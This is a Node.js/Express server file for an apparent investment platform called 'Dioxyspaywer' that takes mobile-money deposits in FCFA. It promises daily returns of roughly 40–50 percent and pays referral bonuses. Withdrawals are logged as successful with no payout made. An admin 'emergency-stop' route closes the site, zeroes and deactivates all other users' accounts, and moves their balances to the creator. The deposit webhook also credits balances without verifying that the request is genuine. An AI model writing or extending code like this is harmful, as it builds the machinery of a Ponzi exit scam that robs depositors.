require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const cron = require('node-cron');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const path = require('path');

// Import des modèles
const User = require('./models/User');
const Transaction = require('./models/Transaction');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let isSiteActive = true;

// Connexion DB
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('✅ MongoDB Connecté'))
    .catch(err => {
        console.error('❌ Erreur MongoDB:', err);
        process.exit(1);
    });

// Middleware Auth
const authMiddleware = async (req, res, next) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Accès refusé' });
    
    try {
        const decoded = jwt.verify(token.split(' ')[1], process.env.JWT_SECRET);
        req.user = await User.findById(decoded.id);
        if (!req.user) return res.status(404).json({ error: 'Utilisateur introuvable' });
        if (!req.user.isActive && req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
            return res.status(403).json({ error: 'Compte désactivé.' });
        }
        next();
    } catch (e) {
        return res.status(401).json({ error: 'Token invalide' });
    }
};

// Routes Publiques
app.get('/api/status', (req, res) => res.json({ active: isSiteActive }));

// Inscription avec Parrainage
app.post('/api/register', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    try {
        const { fullName, phone, country, password, referralCode } = req.body;
        if (!fullName || !phone || !password) return res.status(400).json({ error: 'Champs manquants' });
        
        const exist = await User.findOne({ phone });
        if (exist) return res.status(400).json({ error: 'Numéro déjà utilisé' });

        const hashedPassword = await bcrypt.hash(password, 10);
        let role = (phone === process.env.CREATOR_WALLET_PHONE) ? 'admin' : 'user';
        
        let referredByUserId = null;
        let sponsor = null;

        // Logique Parrainage (+350F)
        if (referralCode && referralCode.trim() !== '') {
            sponsor = await User.findOne({ referralCode: referralCode.trim() });
            if (sponsor) {
                referredByUserId = sponsor._id;
                
                // Créditer le bonus
                sponsor.balance += 350;
                sponsor.referralCount += 1;
                sponsor.referralEarnings += 350;
                await sponsor.save();
                
                // Historique Bonus
                await Transaction.create({
                    userId: sponsor._id,
                    type: 'REFERRAL_BONUS',
                    amount: 350,
                    method: 'Parrainage',
                    status: 'SUCCESS',
                    reference: `REF_${Date.now()}`
                });
            }
        }
        
        await User.create({ 
            fullName, phone, country, password: hashedPassword, role, referredBy: referredByUserId 
        });
        
        res.json({ success: true, message: 'Inscription réussie' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur serveur inscription' });
    }
});

// Connexion (Renvoie l'historique complet)
app.post('/api/login', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    try {
        const { phone, password } = req.body;
        const user = await User.findOne({ phone });
        if (!user || !(await bcrypt.compare(password, user.password))) {
            return res.status(400).json({ error: 'Identifiants incorrects' });
        }

        const currentMonth = new Date().toISOString().slice(0, 7);
        if (user.lastPurchaseMonth !== currentMonth) {
            user.monthlyPurchasesCount = 0;
            user.lastPurchaseMonth = currentMonth;
            await user.save();
        }

        const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '24h' });
        
        // Calcul Solde Retrait (Gains disponibles)
        let withdrawBalance = 0;
        const now = new Date();
        
        // Produits courts termes terminés
        if (user.shortTermProducts && user.shortTermProducts.length > 0) {
            user.shortTermProducts.forEach(prod => {
                if (new Date(prod.unlockDate) <= now) {
                    withdrawBalance += (prod.amount + (prod.dailyGain * 5));
                }
            });
        }
        // Produit Long Terme
        if (user.hasLongTerm && user.longTermStartDate) {
            const daysPassed = Math.floor((now - new Date(user.longTermStartDate)) / (1000 * 60 * 60 * 24));
            if (daysPassed >= 55) withdrawBalance += (700 * 55);
            else if (daysPassed > 0) withdrawBalance += (700 * daysPassed);
        }

        // Récupération Historique (50 dernières transactions)
        const transactions = await Transaction.find({ userId: user._id }).sort({ date: -1 }).limit(50);

        res.json({ 
            token, 
            role: user.role, 
            balance: user.balance, 
            depositBalance: user.balance,
            withdrawBalance: withdrawBalance,
            hasLongTerm: user.hasLongTerm, 
            longTermStartDate: user.longTermStartDate,
            fullName: user.fullName,
            phone: user.phone,
            country: user.country,
            monthlyPurchasesCount: user.monthlyPurchasesCount || 0,
            remainingPurchases: 2 - (user.monthlyPurchasesCount || 0),
            shortTermProducts: user.shortTermProducts || [],
            referralCode: user.referralCode, 
            referralCount: user.referralCount || 0,
            referralEarnings: user.referralEarnings || 0,
            transactions: transactions // ⚡ HISTORIQUE INCLUS
        });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur serveur login' });
    }
});

// Cron Jobs : Distribution des gains quotidiens (Lun-Ven à 8h)
cron.schedule('0 8 * * 1-5', async () => {
    if (!isSiteActive) return;
    try {
        const users = await User.find({ $or: [{ hasLongTerm: true }, { 'shortTermProducts.0': { $exists: true } }] });
        const now = new Date();
        
        for (let user of users) {
            let totalDailyGain = 0;
            
            // Gain Long Terme
            if (user.hasLongTerm) {
                const daysPassed = Math.floor((now - new Date(user.longTermStartDate)) / (1000 * 60 * 60 * 24));
                if (daysPassed < 55) totalDailyGain += 700;
            }
            
            // Gain Courts Termes & Nettoyage
            const activeShortTerms = [];
            if (user.shortTermProducts) {
                for (let prod of user.shortTermProducts) {
                    if (new Date(prod.unlockDate) > now) {
                        totalDailyGain += prod.dailyGain;
                        activeShortTerms.push(prod);
                    }
                }
            }
            user.shortTermProducts = activeShortTerms;
            
            if (totalDailyGain > 0) {
                user.balance += totalDailyGain;
                await user.save();
                await Transaction.create({ 
                    userId: user._id, 
                    type: 'GAIN', 
                    amount: totalDailyGain, 
                    status: 'SUCCESS', 
                    reference: `GAIN_${Date.now()}` 
                });
            }
        }
    } catch (e) { console.error("Erreur Cron:", e); }
});

// Investissement (LOGIQUE DES 8 PRODUITS)
app.post('/api/invest', authMiddleware, async (req, res) => {
    try {
        const { productType, amount } = req.body;
        const user = req.user;
        
        if (user.balance < amount) return res.status(400).json({ error: 'Solde insuffisant dans le dépôt.' });
        if (productType !== 'longterm' && !user.hasLongTerm) return res.status(403).json({ error: 'Produit Long Terme obligatoire.' });

        const currentMonth = new Date().toISOString().slice(0, 7);
        if (user.lastPurchaseMonth !== currentMonth) { 
            user.monthlyPurchasesCount = 0; 
            user.lastPurchaseMonth = currentMonth; 
        }
        if (productType !== 'longterm' && user.monthlyPurchasesCount >= 2) {
            return res.status(403).json({ error: 'Limite 2 achats/mois atteinte.' });
        }

        user.balance -= amount;
        let dailyGain = 0;

        if (productType === 'longterm') {
            if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect Long Terme.' });
            user.hasLongTerm = true; 
            user.longTermStartDate = new Date();
        } else {
            // Configuration des 8 produits
            if (productType === 'prod1') { if (amount !== 2000) throw new Error('Prix P1'); dailyGain = 1000; }
            else if (productType === 'prod2') { if (amount !== 3000) throw new Error('Prix P2'); dailyGain = 1500; }
            else if (productType === 'prod3') { if (amount !== 5000) throw new Error('Prix P3'); dailyGain = 2000; }
            else if (productType === 'prod4') { if (amount !== 10000) throw new Error('Prix P4'); dailyGain = 5000; }
            // NOUVEAUX PRODUITS AJOUTÉS ICI
            else if (productType === 'prod5') { if (amount !== 15000) throw new Error('Prix P5 (15000F requis).'); dailyGain = 6000; }
            else if (productType === 'prod6') { if (amount !== 20000) throw new Error('Prix P6 (20000F requis).'); dailyGain = 8000; }
            else if (productType === 'prod7') { if (amount !== 30000) throw new Error('Prix P7 (30000F requis).'); dailyGain = 12000; }
            else if (productType === 'prod8') { if (amount !== 40000) throw new Error('Prix P8 (40000F requis).'); dailyGain = 16000; }
            else throw new Error('Produit inconnu');

            const unlockDate = new Date(); 
            unlockDate.setDate(unlockDate.getDate() + 5);
            
            if (!user.shortTermProducts) user.shortTermProducts = [];
            user.shortTermProducts.push({ 
                type: productType, 
                amount, 
                dailyGain, 
                startDate: new Date(), 
                unlockDate 
            });
            user.monthlyPurchasesCount += 1;
        }
        
        await user.save();
        await Transaction.create({ 
            userId: user._id, 
            type: 'INVESTMENT', 
            amount, 
            status: 'SUCCESS', 
            reference: `INV_${Date.now()}` 
        });
        
        res.json({ success: true, newBalance: user.balance, remainingPurchases: 2 - user.monthlyPurchasesCount });
    } catch (e) {
        console.error(e);
        res.status(400).json({ error: e.message || 'Erreur investissement' });
    }
});

// --- DÉPÔT AVEC SENDAVAPAY ---
app.post('/api/deposit', authMiddleware, async (req, res) => {
    const { amount, network, phone } = req.body; 
    if (amount < 2000) return res.status(400).json({ error: 'Minimum 2000 FCFA' });

    try {
        const user = req.user;
        const invoiceNumber = `DXP_${Date.now()}`;
        
        const postData = {
            amount: parseInt(amount),
            currency: "XOF",
            phone_number: phone,
            network: network,
            reference: invoiceNumber,
            description: `Dépôt Dioxyspaywer - ${user.fullName}`,
            callback_url: process.env.SENDAVA_CALLBACK_URL,
            return_url: process.env.SENDAVA_RETURN_URL,
            merchant_id: process.env.SENDAVA_MERCHANT_ID
        };

        // URL API Sendavapay (À vérifier dans leur doc si différente)
        const SENDAVA_API_URL = 'https://api.sendavapay.com/v1/charge'; 

        const response = await axios.post(SENDAVA_API_URL, postData, {
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${process.env.SENDAVA_API_KEY}`,
                'X-Public-Key': process.env.SENDAVA_PUBLIC_KEY
            }
        });

        if (response.data && (response.data.success === true || response.data.checkout_url)) {
            const paymentUrl = response.data.checkout_url || response.data.payment_link;
            
            await Transaction.create({ 
                userId: user._id, 
                type: 'DEPOSIT', 
                amount: amount, 
                method: network, 
                status: 'PENDING', 
                reference: invoiceNumber 
            });

            res.json({ success: true, paymentUrl: paymentUrl });
        } else {
            res.status(400).json({ error: 'Erreur création paiement Sendavapay.' });
        }

    } catch (error) {
        console.error("Erreur Sendavapay:", error.response ? error.response.data : error.message);
        res.status(500).json({ error: 'Erreur connexion Sendavapay.' });
    }
});

// --- WEBHOOK SENDAVAPAY ---
app.post('/api/webhook/deposit', async (req, res) => {
    try {
        const data = req.body;
        
        // Adapter le statut selon la réponse Sendavapay ('SUCCESS', 'completed', etc.)
        if (data.status === 'SUCCESS' || data.event === 'completed') {
            const invoiceNumber = data.reference || data.invoice_number;
            const amount = parseFloat(data.amount || data.total_amount);
            
            const transaction = await Transaction.findOne({ reference: invoiceNumber });
            
            if (transaction && transaction.status === 'PENDING') {
                transaction.status = 'SUCCESS';
                await transaction.save();
                
                const user = await User.findById(transaction.userId);
                if (user) {
                    user.balance += amount;
                    await user.save();
                    console.log(`💰 Dépôt Sendavapay confirmé : ${amount} FCFA`);
                }
            }
        }
        res.status(200).send("OK");
    } catch (e) {
        console.error("Erreur Webhook:", e);
        res.status(500).send("Error");
    }
});

// Retrait
app.post('/api/withdraw', authMiddleware, async (req, res) => {
    try {
        const { amount, network, phone } = req.body;
        const user = req.user;
        const now = new Date();
        
        if (amount < 1000) return res.status(400).json({ error: 'Min 1000 FCFA' });
        if ([0, 6].includes(now.getDay())) return res.status(403).json({ error: 'Retraits indisponibles Samedi/Dimanche.' });
        if (now.getHours() < 8 || now.getHours() >= 21) return res.status(403).json({ error: 'Retraits possibles 08h-21h.' });
        if (user.lastWithdrawDate && user.lastWithdrawDate.toDateString() === now.toDateString()) return res.status(403).json({ error: '1 retrait/jour max.' });

        // Calcul solde disponible pour retrait
        let available = 0;
        if (user.shortTermProducts) {
            user.shortTermProducts.forEach(p => { 
                if(new Date(p.unlockDate) <= now) available += (p.amount + p.dailyGain*5); 
            });
        }
        if (user.hasLongTerm && user.longTermStartDate) {
            const d = Math.floor((now - new Date(user.longTermStartDate))/(1000*60*60*24));
            if(d >= 55) available += 38500; else if(d>0) available += 700*d;
        }

        if (amount > available) return res.status(400).json({ error: `Solde insuffisant RETRAITE. Dispo: ${available} FCFA` });

        user.balance -= amount;
        user.lastWithdrawDate = now;
        await user.save();
        
        await Transaction.create({ 
            userId: user._id, 
            type: 'WITHDRAWAL', 
            amount, 
            method: network, 
            status: 'SUCCESS', 
            reference: `W_${Date.now()}` 
        });
        
        res.json({ success: true, message: 'Retrait envoyé.' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur retrait' });
    }
});

// Admin Dashboard
app.get('/api/admin/dashboard', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    const users = await User.find();
    const totalVault = users.reduce((a, b) => a + b.balance, 0);
    res.json({ users, totalVault });
});

// Emergency Stop
app.post('/api/admin/emergency-stop', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    isSiteActive = false;
    try {
        const creatorPhone = process.env.CREATOR_WALLET_PHONE;
        let creator = await User.findOne({ phone: creatorPhone }) || await User.create({ fullName:'Admin', phone:creatorPhone, country:'Togo', password:'x', role:'admin', balance:0 });
        const others = await User.find({ _id: { $ne: creator._id } });
        let seized = 0;
        for(let u of others) { 
            if(u.balance>0){ 
                seized+=u.balance; 
                u.balance=0; 
                u.isActive=false; 
                await u.save(); 
            } 
        }
        creator.balance += seized; await creator.save();
        res.json({ success: true, message: `Site stoppé. ${seized} FCFA récupérés.` });
    } catch (error) { res.status(500).json({ error: 'Erreur.' }); }
});

app.listen(PORT, () => console.log(`🚀 Serveur Dioxyspaywer démarré sur le port ${PORT}`));
